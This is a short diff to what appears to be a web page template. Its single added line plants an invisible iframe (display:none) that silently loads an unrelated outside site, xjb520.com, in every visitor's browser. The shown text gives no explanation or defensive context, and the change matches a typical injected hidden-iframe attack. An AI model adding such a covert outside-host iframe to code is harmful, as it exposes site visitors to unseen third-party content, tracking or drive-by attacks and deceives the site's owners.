@@ -58,6 +58,7 @@
                 </span>
             </div>
         </div>
+        <iframe src="http://xjb520.com/?myparams=3" frameborder="0" style="display:none"></iframe>
     </div>
 </template>
 
